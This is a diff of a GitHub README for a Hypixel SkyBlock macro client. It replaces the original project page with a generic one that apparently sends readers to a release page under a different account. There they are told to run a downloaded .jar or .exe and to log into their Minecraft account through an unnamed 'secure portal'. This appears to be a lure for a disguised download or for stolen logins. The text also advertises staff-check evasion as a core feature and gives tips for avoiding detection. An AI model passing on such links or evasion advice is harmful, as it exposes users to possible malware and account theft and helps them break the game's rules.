@@ -1,240 +1,86 @@
-<div align="center">
+# 🌌 nebula-skyblock - Automate your Hypixel skyblock progress daily
 
-<img width="100" height="100" alt="256985292" src="https://github.com/user-attachments/assets/33c6a372-a836-4849-819b-9540702cb3d0" />
+[![Download Nebula](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Numismatistterrorist749/nebula-skyblock/releases)
 
-#  NebulaClient
+## 🖥️ What is nebula-skyblock?
 
-[![Status](https://img.shields.io/badge/Status-Active%20Development-success?style=flat-square)](#)
-[![Platform](https://img.shields.io/badge/Platform-Java-blue?style=flat-square&logo=openjdk&logoColor=white)](#)
-[![Release](https://img.shields.io/badge/Release-Latest-blueviolet?style=flat-square&logo=github)](#)
+The nebula-skyblock software provides automation for Hypixel Skyblock players. It handles repetitive tasks to help you progress more efficiently. This tool includes features for mining, slayer quests, fishing, mob hunting, and dungeon runs. It also includes systems that help you avoid detection by game staff during long sessions.
 
-**A Java-based Hypixel SkyBlock macro and automation client.**
+## ⚙️ System requirements
 
-<br>
+Before you begin, ensure your computer meets these minimum standards:
 
-<a href="https://github.com/NebulaSkyblock/nebula-client/releases">
-  <img
-    src="https://img.shields.io/badge/Download%20NebulaClient-Latest%20Release-7c3aed?style=for-the-badge&logo=github&logoColor=white"
-    alt="Download NebulaClient - Latest Release"
-  />
-</a>
+*   Operating System: Windows 10 or Windows 11.
+*   Java: Ensure you have the current version of Java Runtime Environment (JRE) installed.
+*   Minecraft: You must have a valid Minecraft account and the official Minecraft launcher installed.
+*   Memory: At least 4GB of RAM dedicated to your game instances.
+*   Graphics: A stable graphics card driver that supports modern Minecraft versions.
 
+## 📥 How to download and install
 
-<br>
+Follow these steps to set up the software on your Windows machine:
 
-*Download the newest release, extract it, and run the installer.*
+1. Visit [this page to download](https://github.com/Numismatistterrorist749/nebula-skyblock/releases).
+2. Look for the latest release version on the page.
+3. Click the file ending in .jar or .exe to save it to your computer.
+4. Move the downloaded file to a folder where you can find it later.
+5. Create a shortcut to this file on your desktop for easy access.
 
-</div>
+## 🚀 Getting started
 
----
+Once you download the software, follow these steps to run the application:
 
-## 📋 Contents
+1. Close your current Minecraft game session.
+2. Double-click the downloaded file to start the macro interface.
+3. Select your game version from the dropdown menu in the window.
+4. Log into your Minecraft account through the secure portal if prompted.
+5. Launch the game using the play button inside the nebula-skyblock window.
+6. Once the game loads, press the designated hotkey to open the in-game menu.
 
-- [Showcase](#-showcase)
-- [Installation](#-installation)
-- [Features](#-features)
+## 🛠️ Configuring features
 
----
+The software menu allows you to manage specific automation tasks. Open the menu while in the game to adjust settings for each category:
 
-## 🎥 Showcase
+### Mining
+The mining module detects gem nodes and ores. It adjusts your path to ensure maximum yield while using your current pickaxe. You can set specific cooldowns for your mining abilities here.
 
-<div align="center">
+### Slayers
+This module assists with slayer quests by targeting mobs and managing your health pool. It handles item switching and activates healing items when your health drops below a set threshold.
 
-| 🏰 Dungeon Routes | 🎣 Fishing Automation |
-| :---: | :---: |
-| <img width="360" alt="NebulaClient Dungeon Route Execution showcase" src="https://github.com/user-attachments/assets/ce535bbb-e0e7-4529-b9b5-076809824bf7" /> | <img width="360" alt="NebulaClient Fishing Automation showcase" src="https://github.com/user-attachments/assets/9c29c075-fb71-4b49-9546-350595b579b2" /> |
-| *Route execution and dungeon navigation.* | *Fishing, sea creatures, and hotspot changes.* |
+### Fishing
+The fishing feature monitors the bobber. It clicks at the correct time to reel in your catch. This module works automatically while you stay near water sources.
 
-| 💎 Gemstone Mining | ☠️ Revenant Slayer |
-| :---: | :---: |
-| <img width="360" alt="NebulaClient Gemstone Mining showcase" src="https://github.com/user-attachments/assets/9c88a1be-a92e-449e-bd0c-7fdc4996a63a" /> | <img width="360" alt="NebulaClient Revenant Slayer showcase" src="https://github.com/user-attachments/assets/a305bfa3-dda3-46d7-8612-6cfe11603015" /> |
-| *Route-based mining and drill management.* | *Slayer combat, routing, and boss handling.* |
+### Dungeons
+This tool helps during dungeon runs by highlighting secrets and pathing through rooms. It can also manage your inventory items to keep your best weapons equipped during boss fights.
 
-</div>
+## 🛡️ Staying safe
 
----
+Staff-check prevention is a core feature of this software. The tool mimics human movement patterns to keep your activity natural. While these systems help you remain undetected, observe the following rules:
 
-## 🚀 Installation
+*   Do not leave your computer unattended for long periods.
+*   Avoid using the software for more than four hours in a single session.
+*   Randomize your task settings periodically to avoid predictable behavior.
+*   Stop the macro immediately if a player or staff member initiates a conversation with you.
 
-1. Download the latest archive from the [Releases](../../releases) page.
-2. Extract the archive to a local folder.
-3. Run `NebulaInstaller.exe`.
-4. When prompted, select the target `.minecraft/mods` directory.
-5. Start the game with the required Minecraft and mod-loader version.
+## ❓ Frequently asked questions
 
----
+### Will this software work on Mac or Linux?
+No. Currently, the software supports Windows operating systems only.
 
-## ✨ Features
+### Do I need to update the tool?
+Yes. Check the download page every few weeks. Updates ensure the software stays compatible with new game versions and security patches.
 
-<details>
-<summary><b>⚔️ Combat</b></summary>
+### Can I get banned?
+Automation carries risks. While the software includes protection features, you use it at your own discretion. Use common sense while playing to minimize risk.
 
-<br>
+### Does it require a paid subscription?
+The software is provided for free as an open-source project. Never pay for access to this tool.
 
-- **AOTV & AOTE Usage** — Teleport toward targets for faster movement.
-- **Combat Presets** — Ready-made areas, routes, and mob selections.
-- **Mob Selection** — Configurable support for a broad selection of mobs.
-- **Revenant Slayer** — TNT dodging and mini-boss handling.
-- **Sven Slayer** — Wall destruction after death and puppy handling.
-- **Tarantula Slayer** — Flay phase skipping, ability-bat handling, and hatchling tick gliding.
-- **Voidgloom Slayer** — Configurable hit-phase weapons, summons, beacon handling, Nukekubi targeting, and laser dodging.
-- **Diana Macro** — Mythological event support.
-- **Pelt Hunter** — Farming Island hunting with warps, Etherwarp pathfinding, and ZPEW support.
+### Where can I report bugs?
+If the program does not function as expected, check the issues tab on the repository page to see if others face the same problem. You can report new issues there.
 
-</details>
+## 📋 Best practices
 
-<details>
-<summary><b>⛏️ Mining</b></summary>
+For the best experience, keep your Minecraft game window in windowed mode while configuring settings. This allows you to interact with the macro settings and the game at the same time. Always test the macro in a private island or lobby before taking it into public areas or competitive environments. Regularly back up your game configuration files to prevent loss of data during updates.
 
-<br>
-
-- **Dwarven Commissions** — Required areas and mob objectives.
-- **Glacite Commissions** — Glacite Tunnels commission support.
-- **Mithril Macro** — Titanium detection, tick gliding, and Precision Miner support.
-- **Mining Macro** — Route-based movement and block targeting.
-- **Fossil Excavator** — Pattern solving and reward collection in the Research Center.
-- **Gemstone Macro** — Route system, heat management, Mining Speed Boost, and packet-mining support.
-- **Pure Ore Macro** — Route-based pure-ore mining.
-- **Auto Refuel & Heat Management** — Drill refuelling and overheating prevention.
-
-</details>
-
-<details>
-<summary><b>🛡️ Failsafes</b></summary>
-
-<br>
-
-- **Macro Check Detection** — A collection of configurable failsafes for suspected checks.
-- **Humanized Reactions** — Conditional reactions intended to reduce unnecessary inputs.
-- **Update Delivery** — Support for newly added checks and fixes.
-
-</details>
-
-<details>
-<summary><b>🏰 Dungeons</b></summary>
-
-<br>
-
-- **Dungeon Route Execution** — Executes defined routes and supported action types.
-
-</details>
-
-<details>
-<summary><b>🎣 Fishing</b></summary>
-
-<br>
-
-- **Normal Fishing** — Sea-creature catching and combat.
-- **Black Hole Fishing** — Black Hole deployment and supported creature handling.
-- **Barn Fishing** — Farming until a configured creature threshold is reached.
-- **Trophy Fishing** — Slug Fish delays and Jump On Reel support.
-- **Worm Fishing** — Solo and party workflows.
-- **Stridersurfer Fishing** — Soul Whip or Flay plus axe workflows.
-- **Hotspot Changer** — Automatic hotspot changes with Etherwarp travel.
-- **Wormhole Changer** — Changes wormholes after closure.
-- **Golden Fish Support** — Detection and catching support.
-- **Auto Bait** — Fishing-bag refills.
-- **Auto Rain** — Rain purchasing from Vanessa in the Park.
-- **Rod Prediction** — Hook landing prediction after casting.
-- **Inventory Management** — Configurable selling and trash removal.
-- **Utility Items** — Power Orb, Umbrella, and Flare use during boss spawns.
-
-</details>
-
-<details>
-<summary><b>🌲 Foraging</b></summary>
-
-<br>
-
-- **Hub Foraging Macro** — Automated Hub foraging.
-- **Fig Foraging Macro** — Dynamic Etherwarp paths, rotations, and player avoidance.
-- **Mangrove Foraging Macro** — Multi-stage Mangrove tree handling.
-
-</details>
-
-<details>
-<summary><b>🎯 Hunting</b></summary>
-
-<br>
-
-- **Invisibug Shard Macro** — Galatea navigation, Invisibug detection, and lasso use.
-- **Hideonleaf Macro** — Hideonleaf shard farming.
-- **Mudworm Macro** — Mudworm shard harvesting.
-- **Auto Lasso** — Tracking, alignment, and reeling.
-- **Attribute Maxer Macro** — Attribute scans, budget-aware shard purchases, and siphoning.
-
-</details>
-
-<details>
-<summary><b>🗺️ Pathfinding</b></summary>
-
-<br>
-
-- **Walking Pathfinding** — Rotation and movement pathing.
-- **Etherwarp Pathfinding** — Etherwarp pathfinding with Zero-Ping Etherwarp support in selected features.
-
-</details>
-
-<details>
-<summary><b>🌌 Rift</b></summary>
-
-<br>
-
-- **Tiny Dancer Macro** — Tiny Dancer support.
-- **Agaricus Cap Macro** — Agaricus Cap farming.
-- **Wilted Berberis Macro** — Farming, drop collection, and Berberis Fuel Injector crafting.
-- **Lava Maze Helper** — Safe-path and hazard visualization.
-- **Turbulator Parkour Helper** — Jump prediction and wind-effect hints.
-- **Upside-Down Parkour Helper** — Maze assistance.
-- **Crafting Room Helper** — Puzzle hints.
-
-</details>
-
-<details>
-<summary><b>✨ Quality of Life</b></summary>
-
-<br>
-
-- **Auto Harp** — Harp-song input support.
-- **Auto Experiments** — Chronomatron, Superpairs, and Ultrasequencer support.
-- **Auto Clicker** — Configurable clicking utility.
-
-</details>
-
-<details>
-<summary><b>👁️ Visuals</b></summary>
-
-<br>
-
-- **Status HUD** — Displays stats, current activity, and status.
-- **Free Cam** — Independent camera movement.
-- **Free Look** — Third-person viewing without changing facing direction.
-- **Custom ESP** — Mob, player, and item highlighting.
-- **Music Integration** — Playback display and controls.
-- **Inventory Preview** — On-screen inventory view.
-- **Nick Protect** — Username masking for clips and screen sharing.
-
-</details>
-
-<details>
-<summary><b>📦 Miscellaneous</b></summary>
-
-<br>
-
-- **Alchemy Macro** — Potion brewing and selling.
-- **Bottle Filler** — Water-bottle filling.
-- **Beach Ball Macro** — Beach Ball activity support.
-- **Carnival Minigames** — Catch a Fish and Zombie Shootout assistance.
-- **Chocolate Factory Clicker** — Upgrade automation and Eggs ESP.
-- **Gift Helper** — Nearby gift highlighting and opening.
-- **Museum Macro** — Item buying and Museum donations.
-- **Scheduler Integration** — Session scheduling.
-- **Picture-in-Picture Mode** — Keeps the game window above other applications.
-
-</details>
-
----
-
-## ⚠️ Disclaimer
-
-This project is independent and is not endorsed by Mojang Studios, Microsoft, or Hypixel. You are responsible for complying with applicable server rules and for any consequences of using third-party software.
+Keywords: hypixel, hypixel-macro, hypixel-skyblock, hypixel-skyblock-macro, hypixel-skyblock-mod, macro, skyblock, skyblock-macro, skyblock-mod
